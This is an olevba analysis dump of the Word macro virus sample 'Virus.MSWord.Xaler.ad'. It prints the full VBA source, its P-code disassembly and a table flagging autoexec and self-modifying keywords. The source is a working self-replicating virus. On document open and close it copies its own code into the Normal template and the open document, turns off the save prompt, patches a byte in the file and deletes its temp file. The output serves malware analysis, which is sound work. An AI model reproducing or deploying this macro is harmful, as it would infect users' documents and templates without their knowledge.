olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Xaler.ad
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Xaler.ad - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'RELAX
Private Sub RELAX2()

End Sub

Private Sub Document_Close()
 GOODSub
Call RELAX2
End Sub

Private Sub GOODSub()
On Error Resume Next
Application.ScreenUpdating = False
Application.Options.SaveNormalPrompt = False
x$ = "C:\temp.tmp"
MacroContainer.VBProject.VBComponents.Item("ThisDocument").Export x$
Open x$ For Input As #1
keimeno = Input(LOF(1), 1)
Close #1
kk& = InStr(1, keimeno, "'RELAX")
keimeno = Right$(keimeno, Len(keimeno) - kk& + 1)
For j = 1 To 2
If j = 1 Then
NormalTemplate.VBProject.VBComponents.Item("ThisDocument").Export x$
Else
ActiveDocument.VBProject.VBComponents.Item("ThisDocument").Export x$
End If
Open x$ For Input As #1
rlx = Input(LOF(1), 1)
Close #1
d1 = InStr(1, rlx, "'RELAX")
If d1 = 0 Then
If j = 1 Then
NormalTemplate.VBProject.VBComponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
NormalTemplate.Save
Else
ActiveDocument.VBProject.VBComponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
End If
End If
Next j
'====================
Dim PRostasia As Byte
PRostasia = 1
fff = FreeFile
If Dir(ActiveDocument.FullName, 6) <> "" Then
Open ActiveDocument.FullName For Binary As #fff
Put #fff, 862, PRostasia
Close #fff
ActiveDocument.Save
End If
Kill x$
Application.ScreenUpdating = True
End Sub

Private Sub Document_New()

End Sub

Private Sub Document_Open()
Call GOODSub


On Error Resume Next
Application.ScreenUpdating = False
Application.Options.SaveNormalPrompt = False
x$ = "C:\temp.tmp"
MacroContainer.VBProject.VBComponents.Item("ThisDocument").Export x$
Open x$ For Input As #1
keimeno = Input(LOF(1), 1)
Close #1
kk& = InStr(1, keimeno, "'RELAX")
keimeno = Right$(keimeno, Len(keimeno) - kk& + 1)
For j = 1 To 2
If j = 1 Then
NormalTemplate.VBProject.VBComponents.Item("ThisDocument").Export x$
Else
ActiveDocument.VBProject.VBComponents.Item("ThisDocument").Export x$
End If
Open x$ For Input As #1
rlx = Input(LOF(1), 1)
Close #1
d1 = InStr(1, rlx, "'RELAX")
If d1 = 0 Then
If j = 1 Then
NormalTemplate.VBProject.VBComponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
NormalTemplate.Save
Else
ActiveDocument.VBProject.VBComponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
End If
End If
Next j
'====================
Dim PRostasia As Byte
PRostasia = 1
fff = FreeFile
If Dir(ActiveDocument.FullName, 6) <> "" Then
Open ActiveDocument.FullName For Binary As #fff
Put #fff, 862, PRostasia
Close #fff
ActiveDocument.Save
End If
Kill x$
Application.ScreenUpdating = True
End Sub































































































































































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Xaler.ad
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7336 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0005 "RELAX"
' Line #1:
' 	FuncDefn (Private Sub RELAX2())
' Line #2:
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub Document_Close())
' Line #6:
' 	ArgsCall GOODSub 0x0000 
' Line #7:
' 	ArgsCall (Call) RELAX2 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Private Sub GOODSub())
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #14:
' 	LitStr 0x000B "C:\temp.tmp"
' 	St x$ 
' Line #15:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	Ld x$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #17:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Input$ 0x0002 
' 	St keimeno 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x0006 "'RELAX"
' 	FnInStr3 
' 	St kk& 
' Line #20:
' 	Ld keimeno 
' 	Ld keimeno 
' 	FnLen 
' 	Ld kk& 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Right$ 0x0002 
' 	St keimeno 
' Line #21:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #22:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #23:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #24:
' 	ElseBlock 
' Line #25:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld x$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #28:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Input$ 0x0002 
' 	St rlx 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld rlx 
' 	LitStr 0x0006 "'RELAX"
' 	FnInStr3 
' 	St d1 
' Line #31:
' 	Ld d1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #32:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #34:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	ElseBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	QuoteRem 0x0000 0x0014 "===================="
' Line #41:
' 	Dim 
' 	VarDefn PRostasia (As Byte)
' Line #42:
' 	LitDI2 0x0001 
' 	St PRostasia 
' Line #43:
' 	Ld Friend 
' 	St fff 
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #45:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld fff 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #46:
' 	Ld fff 
' 	Sharp 
' 	LitDI2 0x035E 
' 	Ld PRostasia 
' 	PutRec 
' Line #47:
' 	Ld fff 
' 	Sharp 
' 	Close 0x0001 
' Line #48:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld x$ 
' 	ArgsCall Kill 0x0001 
' Line #51:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #52:
' 	EndSub 
' Line #53:
' Line #54:
' 	FuncDefn (Private Sub Document_New())
' Line #55:
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Private Sub Document_Open())
' Line #59:
' 	ArgsCall (Call) GOODSub 0x0000 
' Line #60:
' Line #61:
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #64:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #65:
' 	LitStr 0x000B "C:\temp.tmp"
' 	St x$ 
' Line #66:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #67:
' 	Ld x$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #68:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Input$ 0x0002 
' 	St keimeno 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #70:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x0006 "'RELAX"
' 	FnInStr3 
' 	St kk& 
' Line #71:
' 	Ld keimeno 
' 	Ld keimeno 
' 	FnLen 
' 	Ld kk& 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Right$ 0x0002 
' 	St keimeno 
' Line #72:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #73:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	Ld x$ 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	Ld x$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #79:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Input$ 0x0002 
' 	St rlx 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #81:
' 	LitDI2 0x0001 
' 	Ld rlx 
' 	LitStr 0x0006 "'RELAX"
' 	FnInStr3 
' 	St d1 
' Line #82:
' 	Ld d1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #83:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #84:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #85:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #86:
' 	ElseBlock 
' Line #87:
' 	LitDI2 0x0001 
' 	Ld keimeno 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' 	QuoteRem 0x0000 0x0014 "===================="
' Line #92:
' 	Dim 
' 	VarDefn PRostasia (As Byte)
' Line #93:
' 	LitDI2 0x0001 
' 	St PRostasia 
' Line #94:
' 	Ld Friend 
' 	St fff 
' Line #95:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld fff 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #97:
' 	Ld fff 
' 	Sharp 
' 	LitDI2 0x035E 
' 	Ld PRostasia 
' 	PutRec 
' Line #98:
' 	Ld fff 
' 	Sharp 
' 	Close 0x0001 
' Line #99:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Ld x$ 
' 	ArgsCall Kill 0x0001 
' Line #102:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #103:
' 	EndSub 
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' Line #262:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

